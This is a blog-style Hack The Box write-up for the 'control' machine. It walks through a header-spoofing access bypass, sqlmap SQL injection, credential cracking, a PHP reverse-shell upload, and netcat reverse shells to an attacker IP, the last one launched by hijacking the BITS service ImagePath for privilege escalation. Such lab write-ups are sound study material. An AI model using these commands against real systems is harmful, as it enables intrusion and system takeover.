---
layout: post
title: "[HTB] control"
date: 2020-04-27 04:11:00 +0300
categories: htb hack
---

# control

# portscan

* 80/tcp httpd
* 3306/tcp mysql
* 49666/tcp rpc
* 49667/tcp rcp

# user

## httpd
Comment inside http://control.htb/index.php
&nbsp;
```html
<!-- To Do:
 - Import Products
 -  - Link to new payment system
 -   - Enable SSL (Certificates location \192.168.4.28\myfiles) 
 -   <!-- Header --!>
```
&nbsp;
/admin.php and /index.php returns
Access denied! Header missing. Please make sure you go through the proxy to access this page.
&nbsp;
Use **X-Forwarded-For: 192.168.4.28** header to access the pages.
&nbsp;
Looking around the site found the sqli.

Create request with Burp
&nbsp;
```text
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=5
```
&nbsp;
Use sqlmap for fun and profit
&nbsp;
```terminal
sqlmap --all -r request
```
&nbsp;
```text
private static $dbUsername = 'manager';
private static $dbUserPassword = 'l3tm3!n';
```
&nbsp;
Crack user hashes from the mysql user database with john

**Hector: l33th4x0rhector**
&nbsp;
Also upload a reverse shell
&nbsp;
```terminal
sqlmap -r request --file-dest=C:/inetpub/wwwroot/krypt2.php --file-write=./krypt2.php
```
&nbsp;
Enter a new powershell session with Hector creds or use them to run a process

```powershell
$pass = convertto-securestring "l33th4x0rhector" -asplaintext -force
$cred = new-object system.management.automation.pscredential("CONTROL\Hector", $pass)
$sess = new-pssession -Credential $cred
enter-pssession $sess
```
&nbsp;
or
&nbsp;
```powershell
invoke-command -credential $cred -computername localhost -scriptblock {C:\windows\temp\ncnc.exe 10.10.14.7 6667 -e cmd.exe}
```

---

# root
&nbsp;
run usual windows privesc checks
&nbsp;
Note to self: 

```powershell
cat (Get-PSReadlineOption).HistorySavePath
```
&nbsp;
Hector can modify ImagePath value of services.

```powershell
get-childitem HKLM:\SYSTEM\CurrentControlSet\Services\BITS | fl
get-itemproperty HKLM:\SYSTEM\CurrentControlSet\Services\BITS | fl
get-acl HKLM:\SYSTEM\CurrentControlSet\Services\BITS |fl
set-itemproperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -Name "ImagePath" -Value "C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.176 6666 -e cmd.exe"
cmd /c bitsadmin.exe /list /verbose
```
